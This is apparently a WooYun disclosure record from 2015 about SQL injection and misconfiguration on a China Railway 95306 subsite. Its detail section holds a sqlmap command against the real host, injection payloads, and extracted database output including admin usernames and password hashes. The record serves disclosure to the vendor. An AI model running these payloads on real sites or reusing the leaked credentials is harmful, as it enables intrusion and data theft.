{"id": 31424, "wybug_id": "wooyun-2015-0114014", "wybug_title": "中国铁路总公司95306分站SQL注入+配置不当", "wybug_corp": "12306", "wybug_author": "乌有先生", "wybug_date": "2015-05-14 12:38", "wybug_open_date": "2015-06-30 15:04", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-30：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 95306分站，SQL注入、目录配置不当可遍历、敏感信息泄露、网站逻辑设计不当 详细说明：  95306主站\n\n95306电子商务分站\n\n0x00、SQL注入\nsqlmap -u \"https://xsp.95306.cn:443/page.asp?id=-1\"\n---Parameter: id (GET)    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: id=-1;WAITFOR DELAY '0:0:5'--    Type: UNION query    Title: Generic UNION query (NULL) - 7 columns    Payload: id=-1 UNION ALL SELECT NULL,NULL,NULL,NULL,CHAR(113)+CHAR(107)+CHAR(112)+CHAR(107)+CHAR(113)+CHAR(102)+CHAR(73)+CHAR(121)+CHAR(71)+CHAR(76)+CHAR(119)+CHAR(76)+CHAR(117)+CHAR(107)+CHAR(99)+CHAR(113)+CHAR(98)+CHAR(118)+CHAR(98)+CHAR(113),NULL,NULL-- ---web server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, Microsoft IIS 7.5, ASPback-end DBMS: Microsoft SQL Server 2008available databases [7]:[*] master[*] model[*] msdb[*] ReportServer[*] ReportServerTempDB[*] stepgozsdata[*] tempdb---current user is DBA:    False---Database: stepgozsdata[24 tables]+------------------+| KDZF             || about            || adkefu           || admin            || banner           || cart             || complain         || hzxx             || i_pic            || keywords         || msg              || news             || orderfahuo       || orderlist        || pro_addattention || pro_addattention || pro_bclass       || pro_brand        || pro_class        || pro_consultation || pro_fav          || pro_score        || vip_recived      || vip_recived      |+------------------+---Database: stepgozsdata+----------------------+---------+| Table                | Entries |+----------------------+---------+| dbo.vip_recived      | 1713    || dbo.vip_recived      | 1713    || dbo.cart             | 836     || dbo.orderlist        | 582     || dbo.pro_class        | 426     || dbo.pro_bclass       | 68      || dbo.KDZF             | 63      || dbo.pro_brand        | 22      || dbo.orderfahuo       | 17      || dbo.about            | 12      || dbo.banner           | 6       || dbo.pro_fav          | 5       || dbo.hzxx             | 2       || dbo.pro_addattention | 2       || dbo.pro_addattention | 2       || dbo.adkefu           | 1       || dbo.admin            | 1       || dbo.complain         | 1       || dbo.i_pic            | 1       || dbo.keywords         | 1       || dbo.msg              | 1       || dbo.news             | 1       || dbo.pro_consultation | 1       |+----------------------+---------+---Database: stepgozsdataTable: admin[1 entry]+----+------------------+-----------+| id | adminpwd         | adminname |+----+------------------+-----------+| 1  | 7a57a5a743894a0e | admin     |+----+------------------+-----------+---Database: stepgozsdataTable: adkefu[1 entry]+----+--------+------------------+-----------+| id | danwei | adminpwd         | adminname |+----+--------+------------------+-----------+| 9  | P      | fac8fbd2667c6995 | chouming  |+----+--------+------------------+-----------+---其中有大量货运订单详细信息。另外，类似的注入还有好几处。eg:https://xsp.95306.cn:443/brand.asp?brand=-10x01、目录配置不当可遍历eg:\n\n\n\n以上列表中目录均可遍历。0x02、敏感信息泄露\n\n\n\n\n\n\n\n0x03、网站逻辑设计不当任意已注册用户，登陆得到相同页面，包含特定订单信息。未登陆页面：\n\n\n\n登陆任意用户页面：\n\n\n\n难道是测试专用页...?即便这样还是觉得有问题。   漏洞证明：  如上   修复方案：  修整或者下线。   版权声明：转载请注明来源 乌有先生@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-05-19 09:13 厂商回复： 谢谢。 最新状态： 2015-06-11：已修复 2015-06-30：暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}